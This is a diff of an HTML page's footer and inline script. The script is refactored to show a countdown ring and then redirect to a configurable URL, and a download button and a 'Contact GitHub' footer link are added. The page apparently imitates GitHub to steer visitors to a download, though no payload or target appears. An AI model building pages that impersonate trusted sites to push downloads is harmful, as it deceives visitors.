           <a href="#">Privacy</a>
           <a href="#">Security</a>
           <a href="#">Status</a>
           <a href="#">Docs</a>
-          <a href="#">Contact</a>
+          <a href="#">Contact GitHub</a>
           <a href="#">Pricing</a>
           <a href="#">API</a>
           <a href="#">Blog</a>
-        </div>
+        </nav>
       </div>
     </footer>
+
   </div>
 
   <script>
     (() => {
-      const root = document.getElementById("root");
-      const target = root.dataset.redirectUrl || "";
-      const delay = Math.max(0, Number(root.dataset.delayMs || 5000));
+      const root     = document.getElementById('root');
+      const url      = root.dataset.redirectUrl || '';
+      const delay    = Math.max(0, Number(root.dataset.delayMs || 5000));
 
-      const btn = document.getElementById("goBtn");
-      const timeLeft = document.getElementById("timeLeft");
-      const pctText = document.getElementById("pctText");
-      const ring = document.getElementById("ringProgress");
-      const statusLabel = document.getElementById("statusLabel");
+      const arcEl    = document.getElementById('arc');
+      const secsEl   = document.getElementById('secs');
+      const pctEl    = document.getElementById('pct');
+      const wrap     = document.getElementById('ringWrap');
+      const btn      = document.getElementById('dlBtn');
 
-      const radius = 75;
-      const circumference = 2 * Math.PI * radius;
-      ring.style.strokeDasharray = String(circumference);
-      ring.style.strokeDashoffset = String(circumference);
+      const C = 2 * Math.PI * 70; // ≈ 439.8
+      arcEl.style.strokeDasharray  = C;
+      arcEl.style.strokeDashoffset = C;
 
-      let startedAt = performance.now();
-      let frame = null;
-      let redirected = false;
+      let t0 = performance.now(), raf = null, done = false;
 
-      const clamp = (n, min, max) => Math.min(max, Math.max(min, n));
+      function tick(now) {
+        if (done) return;
+        const elapsed  = now - t0;
+        const ratio    = delay === 0 ? 1 : Math.min(elapsed / delay, 1);
+        const secs     = Math.ceil(Math.max(0, delay - elapsed) / 1000);
+        const pct      = Math.round(ratio * 100);
 
-      function update(now) {
-        if (redirected) return;
+        arcEl.style.strokeDashoffset = C * (1 - ratio);
+        secsEl.textContent = secs + 's';
+        pctEl.textContent  = pct + '%';
+        wrap.setAttribute('aria-valuenow', pct);
 
-        const elapsed = now - startedAt;
-        const ratio = delay === 0 ? 1 : clamp(elapsed / delay, 0, 1);
-        const seconds = Math.ceil(Math.max(0, delay - elapsed) / 1000);
-        const percent = Math.round(ratio * 100);
-        const offset = circumference * (1 - ratio);
-
-        timeLeft.textContent = seconds + "s";
-        pctText.textContent = percent + "%";
-        ring.style.strokeDashoffset = String(offset);
-
-        if (percent >= 100) {
-          statusLabel.textContent = "Redirecting";
-          launch();
-          return;
-        }
-
-        if (percent > 65) statusLabel.textContent = "Finalizing";
-        else if (percent > 30) statusLabel.textContent = "Verifying";
-        else statusLabel.textContent = "Processing";
-
-        frame = requestAnimationFrame(update);
+        if (elapsed >= delay) { go(); return; }
+        raf = requestAnimationFrame(tick);
       }
 
-      function launch() {
-        if (redirected) return;
-        redirected = true;
-        if (frame) cancelAnimationFrame(frame);
-        if (target) window.location.assign(target);
+      function go() {
+        if (done) return;
+        done = true;
+        if (raf) cancelAnimationFrame(raf);
+        if (url) window.location.assign(url);
       }
 
-      btn.addEventListener("click", launch);
+      btn.addEventListener('click', go);
 
-      document.addEventListener("visibilitychange", () => {
-        if (document.hidden) {
-          if (frame) cancelAnimationFrame(frame);
-        } else if (!redirected) {
-          frame = requestAnimationFrame(update);
-        }
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden) { if (raf) cancelAnimationFrame(raf); }
+        else if (!done) raf = requestAnimationFrame(tick);
       });
 
-      frame = requestAnimationFrame(update);
+      raf = requestAnimationFrame(tick);
     })();
   </script>
 </body>
